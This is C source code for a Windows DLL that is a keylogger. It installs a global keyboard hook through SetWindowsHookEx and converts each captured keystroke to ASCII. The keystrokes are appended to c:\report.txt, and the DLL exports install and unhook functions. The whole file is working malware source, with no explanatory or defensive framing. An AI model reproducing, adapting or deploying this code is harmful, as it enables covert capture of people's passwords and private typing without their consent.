
#include <windows.h>
#include <stdio.h>

HINSTANCE hins;
static HHOOK hkb=NULL;
FILE *f1;

LRESULT __declspec(dllexport)__stdcall  CALLBACK KeyboardProc(
                            int nCode, 
                           WPARAM wParam, 
                            LPARAM lParam)
{	
char ch;			
if (((DWORD)lParam & 0x40000000) &&(HC_ACTION==nCode))
{		
	if ((wParam==VK_SPACE)||(wParam==VK_RETURN)||(wParam>=0x2f ) &&(wParam<=0x100)) 
	{
		f1=fopen("c:\\report.txt","a+");
		if (wParam==VK_RETURN)
		{	ch='\n';
			fwrite(&ch,1,1,f1);
		}
		else
		{
   			BYTE ks[256];
			GetKeyboardState(ks);
			WORD w;
			UINT scan;
			scan=0;
			ToAscii(wParam,scan,ks,&w,0);
			ch =char(w); 
			fwrite(&ch,1,1,f1);
		}
		fclose(f1);
	}
}LRESULT RetVal = CallNextHookEx( hkb, nCode, wParam, lParam );	
return  RetVal;
}

BOOL __declspec(dllexport)__stdcall installhook(HINSTANCE hinstance)
{
f1=fopen("c:\\report.txt","w");
fclose(f1);
hkb=SetWindowsHookEx(WH_KEYBOARD,(HOOKPROC)KeyboardProc,hinstance,0);

return TRUE;
}

BOOL __declspec(dllexport)  UnHook()
{	
     BOOL unhooked = UnhookWindowsHookEx(hkb);
   // MessageBox(0,"exit","sasa",MB_OK);
     return unhooked;
} 